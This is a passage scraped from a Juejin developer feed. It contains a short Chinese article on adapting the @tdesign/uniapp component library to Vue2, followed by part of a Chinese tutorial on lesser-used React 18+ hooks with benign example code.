itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            @tdesign/uniapp 的 Vue2.x 适配说明
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1987523605435432/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Novlan1
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T04:52:25.000Z" title="Thu Feb 05 2026 04:52:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">背景</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Ftdesign.tencent.com%2Funiapp%2F" target="_blank" title="https://tdesign.tencent.com/uniapp/" ref="nofollow noopener noreferrer">@tdesign/uniapp</a> 在 Vue2 中需要做一些适配。</p>
<ol>
<li>组件库使用了 <code>:v-deep(xxx)</code>，Vue2 下需要用插件转成 <code>::v-deep xxx</code></li>
<li>组件库单位使用了 <code>rpx</code>，这样在小程序等场景更合适。但是默认情况下 H5 环境 <code>node_modules</code> 或 <code>uni_modules</code> 下的内容其实不会转化。</li>
</ol>
<h3 data-id="heading-1">CLI 模式</h3>
<p>模板项目 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnovlan1%2Ftdesign-uniapp-vue2-cli-starter" target="_blank" title="https://github.com/novlan1/tdesign-uniapp-vue2-cli-starter" ref="nofollow noopener noreferrer">github.com/novlan1/tde…</a></p>
<p>解决方案是</p>
<ol>
<li>在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnovlan1%2Ftdesign-uniapp-vue2-cli-starter%2Fblob%2Fmaster%2Fpostcss.config.js" target="_blank" title="https://github.com/novlan1/tdesign-uniapp-vue2-cli-starter/blob/master/postcss.config.js" ref="nofollow noopener noreferrer">postcss.config.js</a> 中增加一些插件</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnovlan1%2Ftdesign-uniapp-vue2-cli-starter%2Fblob%2Fmaster%2Fvue.config.js" target="_blank" title="https://github.com/novlan1/tdesign-uniapp-vue2-cli-starter/blob/master/vue.config.js" ref="nofollow noopener noreferrer">transpileDependencies</a> 中配置 <code>['tdesign-uniapp', 'tdesign-uniapp-chat']</code></li>
</ol>
<h3 data-id="heading-2">HBuilderX 模式</h3>
<p>模板项目 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnovlan1%2Ftdesign-uniapp-vue2-hx-starter" target="_blank" title="https://github.com/novlan1/tdesign-uniapp-vue2-hx-starter" ref="nofollow noopener noreferrer">github.com/novlan1/tde…</a></p>
<p>解决方案类似</p>
<ol>
<li>在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnovlan1%2Ftdesign-uniapp-vue2-cli-starter%2Fblob%2Fmaster%2Fpostcss.config.js" target="_blank" title="https://github.com/novlan1/tdesign-uniapp-vue2-cli-starter/blob/master/postcss.config.js" ref="nofollow noopener noreferrer">postcss.config.js</a> 中增加一些插件，与 CLI 模式有差异</li>
<li>先临时修改 uni_modules/tdesign-uniapp/components 组件样式引入方式</li>
</ol>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-deletion">- &lt;style scoped&gt;</span>
<span class="hljs-deletion">-  @import './button.css';</span>
<span class="hljs-addition">+ &lt;style scoped src="./button.css"&gt;</span>
&lt;/style&gt;
</code></pre>
<p>第2条是临时方案，下一个版本优化下。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[react18+那些不常用hooks]]></title>    <link>https://juejin.cn/post/7602825342229037090</link>    <guid>https://juejin.cn/post/7602825342229037090</guid>    <pubDate>2026-02-05T03:05:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602825342229037090" data-draft-id="7602825342229004322" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="react18+那些不常用hooks"/> <meta itemprop="keywords" content="React.js"/> <meta itemprop="datePublished" content="2026-02-05T03:05:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端探险家Rick"/> <meta itemprop="url" content="https://juejin.cn/user/1623331421554183"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            react18+那些不常用hooks
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1623331421554183/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端探险家Rick
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T03:05:36.000Z" title="Thu Feb 05 2026 03:05:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>react18+那些不常用的hooks汇总</p>
<h3 data-id="heading-1">useActionState</h3>
<p>官方描述：<code>useActionState</code> 是一个可以根据某个表单动作的结果更新 state 的 Hook。
使用场景：如果需要提交表单，尤其是使用原生表单功能，你需要提交表单后<strong>仍在当前页面</strong>，同时<strong>记录下提交的信息</strong>，那么这个hooks会很有帮助。</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params"/>) {  
<span class="hljs-keyword">const</span> [state, formAction, isPending] = <span class="hljs-title function_">useActionState</span>(fn, initialState, permalink);
<span class="hljs-comment">// formAction 用于与form绑定</span>
<span class="hljs-comment">// state 提交后的状态记录</span>
<span class="hljs-comment">// isPending 可以在处理 action 的过程中使用它  </span>
<span class="hljs-keyword">return</span> (  
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">{formAction}</span>&gt;</span>  
{/* ... */}  
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>  
);  
}
</code></pre>
<h3 data-id="heading-2">useFormStatus</h3>
<p>官方描述：<code>useFormStatus</code> 是一个提供上次表单<strong>提交状态</strong>信息的 Hook。
使用场景：<code>useFormStatus</code> 通常会和<code>useActionState</code>同时使用。</p>
<ul>
<li><strong><code>useActionState</code></strong> 告诉页面：“上次提交返回了什么？” → 决定是否显示“密码错误”</li>
<li><strong><code>useFormStatus</code></strong> 告诉按钮：“现在是不是在提交？” → 决定按钮显示“登录中...“</li>
</ul>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Submit</span>(<span class="hljs-params"/>) {  
<span class="hljs-keyword">const</span> status = <span class="hljs-title function_">useFormStatus</span>();  <span class="hljs-comment">//可以看到不需要传递任何参数</span>
<span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">{status.pending}</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>  

} 

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {  
<span class="hljs-keyword">return</span> (  
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">{action}</span>&gt;</span>  
<span class="hljs-tag">&lt;<span class="hljs-name">Submit</span> /&gt;</span>  
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>  
);  
}
</code></pre>
<h3 data-id="heading-3">useSyncExternalStore</h3>
<p>官方描述：<code>useSyncExternalStore</code> 是一个让你订阅外部 store 的 React Hook。
它的作用是连接外部库之后，外部库的状态改变，能知道他们被更新了。这个hooks我认为在基础开发的过程并没有必要，但如果想自己动手造一个类似redux的库，那么这个特性可以加入到你的库中。在最新的redux Tooltik 或者zustand中都是在库的内部封装好的。
这里举一个其他例子</p>
<p><strong>监听窗口尺寸（响应式布局）</strong></p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// 自定义 Hook：获取窗口宽高 </span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">useWindowSize</span>(<span class="hljs-params"/>) { 
<span class="hljs-keyword">return</span> <span class="hljs-title function_">useSyncExternalStore</span>(<span class="hljs-function">(<span class="hljs-params">callback</span>) =&gt;</span> { 
	<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, callback); 
<span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> 
	<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'resize'</span>, callback); }, <span class="hljs-function">() =&gt;</span> ({ 
		<span class="hljs-attr">width</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-attr">height</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span> 
	}), <span class="hljs-function">() =&gt;</span> ({ 
		<span class="hljs-attr">width</span>: <span class="hljs-number">1200</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">800</span> }) <span class="hljs-comment">// SSR 默认值 </span>
	)}
<span class="hljs-comment">// 使用 </span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) { 
	<span class="hljs-keyword">const</span> { width } = <span class="hljs-title function_">useWindowSize</span>(); 
	<span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>当前宽度: {width}px<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>; 
}
</code></pre>
<p><strong>订阅 localStorage（跨标签同步）</strong></p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// 封装 localStorage 订阅</span>
<span class="hljs-keyword">const</span> localStorageStore = {
  <span class="hljs-attr">getSnapshot</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'theme'</span>) || <span class="hljs-string">'light'</span>,
  <span class="hljs-attr">subscribe</span>: <span class="hljs-function">(<span class="hljs-params">callback</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleStorage</span> = (<span class="hljs-params">e</span>) =&gt; {
      <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">'theme'</span>) <span class="hljs-title function_">callback</span>();
    };
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'storage'</span>, handleStorage);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'storage'</span>, handleStorage);
  }
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">useTheme</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">useSyncExternalStore</span>(
    localStorageStore.<span class="hljs-property">subscribe</span>,
    localStorageStore.<span class="hljs-property">getSnapshot</span>
  );
}

<span class="hljs-comment">// 改变主题（其他标签页会自动更新）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">setTheme</span>(<span class="hljs-params">theme</span>) {
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'theme'</span>, theme);
  <span class="hljs-comment">// 触发 storage 事件（同域下其他标签页会收到）</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StorageEvent</span>(<span class="hljs-string">'storage'</span>, { <span class="hljs-attr">key</span>: <span class="hljs-string">'theme'</span> }));
}
</code></pre>
<h3 data-id="heading-4">useDebugValue</h3>
<p>官方描述：<code>useDebugValue</code> 是一个 React Hook，可以让你在 React 开发工具中为自定义 Hook 添加标签。
hooks特性：解决开发者排查问题的痛点</p>
<ol>
<li>不会污染控制台</li>
<li>不会和其他<code>console.log</code>混在一起</li>
<li>在<code>react dev tools</code> 中展示</li>
<li>和组件树、<code>props</code>、<code>state</code> 同屏查看
也就是说它能更好的排查是哪个hooks出现的问题。最好的方式是<code>useDebugValue</code>、<code>console.log</code>、<code>debugger</code>协同使用</li>
</ol>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { useDebugValue } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;  

<span class="hljs-keyword">function</span> <span class="hljs-title function_">useOnlineStatus</span>(<span class="hljs-params"/>) {  
<span class="hljs-comment">// ...  </span>
<span class="hljs-title function_">useDebugValue</span>(isOnline ? <span class="hljs-string">'Online'</span> : <span class="hljs-string">'Offline'</span>);  
<span class="hljs-comment">// ...  </span>
}
</code></pre>
<h3 data-id="heading-5">useEffectEvent</h3>
<p>官方描述：<code>useEffectEvent</code> 是一个 React Hook，它可以让你将 Effect 中的非响应式逻辑提取到一个可复用的函数中，这个函数称为 Effect Event。</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { useEffect, useContext, useEffectEvent } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;  

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Page</span>(<span class="hljs-params">{ url }</span>) {  
<span class="hljs-keyword">const</span> { items } = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ShoppingCartContext</span>);  
<span class="hljs-keyword">const</span> numberOfItems = items.<span class="hljs-property">length</span>;  
<span class="hljs-keyword">const</span> onNavigate = <span class="hljs-title function_">useEffectEvent</span>(<span class="hljs-function">(<span class="hljs-params">visitedUrl</span>) =&gt;</span> {  
<span class="hljs-title function_">logVisit</span>(visitedUrl, numberOfItems);  
});  
  
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {  
<span class="hljs-title function_">onNavigate</span>(url);  
}, [url]);  
<span class="hljs-comment">// ...  </span>
}
</code></pre>
<p>当<code>useEffect</code>中调用一个函数的时候，这个函数有可能不是最新的，这个时候就要使用到了。这是一个看起来很奇怪的工具，因为大多数时候我们是用不上的。
<strong>场景 1：函数只依赖 props，且 props 变化时 effect 本就应该重跑</strong></p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">{ userId }</span>) {
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">fetchUser</span>(userId); <span class="hljs-comment">//  直接用 userId，把 userId 放进依赖</span>
  }, [userId]); 
}
</code></pre>
<p><strong>场景 2：函数是纯工具函数，不读任何组件状态</strong></p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">formatDate</span> = (<span class="hljs-params">date</span>) =&gt; date.<span class="hljs-title function_">toISOString</span>();

<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">formatDate</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>())); <span class="hljs-comment">//无副作用、无闭包问题</span>
}, []);
</code></pre>
<p><strong>场景 3：函数通过参数传入最新值</strong></p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">checkStatus</span>(roomId); <span class="hljs-comment">// roomId 作为参数传入，没问题</span>
  }, <span class="hljs-number">5000</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer);
}, [roomId]); 
</code></pre>
<p><strong>真正需要 <code>useEffectEvent</code> 的典型场景（极少数）</strong></p>
<ul>
<li><strong>监听全局事件</strong>（如 <code>window.addEventListener</code>），回调中要读最新 state</li>
<li><strong>启动长期运行的定时器</strong>（如心跳、轮询），且需要访问最新数据</li>
<li><strong>与第三方库集成</strong>，其回调无法控制调用时机</li>
</ul>
<h3 data-id="heading-6">useInsertionEffect</h3>
<p>官方描述：<code>useInsertionEffect</code> 可以在布局副作用触发之前将元素插入到 DOM 中。<code>useInsertionEffect</code> 是为 [[CSS-in-JS]]  库的作者特意打造的。除非你正在使用 CSS-in-JS 库并且需要注入样式，否则你应该使用 <code>useEffect</code> 或者 <code>useLayoutEffect</code>。
在 React 18 之前，有些 CSS-in-JS 库（比如早期的 styled-components）会在 <strong>组件渲染时</strong> 或 <strong><code>useLayoutEffect</code> 中</strong>动态插入 <code>&lt;style&gt;</code> 标签。
但这会导致性能问题：</p>
<ul>
<li>如果在 <strong>渲染期间</strong> 插入：每帧都可能触发浏览器重新计算样式（非常慢）</li>
<li>如果在 <strong><code>useLayoutEffect</code></strong> 插入：虽然在 DOM 更新后，但在 layout 计算前，<strong>可能让布局读取到“还没生效”的样式</strong>，导致错误</li>
</ul>
<p>于是 React 团队加了一个<strong>更早的时机</strong>：<strong>在 DOM 更新之后、layout 计算之前</strong>，专门给 CSS-in-JS 注入样式用。所以普通业务无需关注。</p>
<h3 data-id="heading-7">useImperativeHandle</h3>
<p>官方描述：<code>useImperativeHandle</code> 是 React 中的一个 Hook，它能让你自定义由 ref暴露出来的句柄。
简单的说就是子组件提供一个对外开放的API可以供父组件操作，他解决了不想暴露整个DOM节点而是只暴露其中几个特定方法。
 举个经典例子：自定义输入框</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">//  默认情况下，父组件拿到的是整个 &lt;input&gt; DOM 节点</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">MyInput</span>(<span class="hljs-params">props</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> {<span class="hljs-attr">...props</span>} /&gt;</span></span>;
}

<span class="hljs-comment">// 父组件</span>
<span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>();
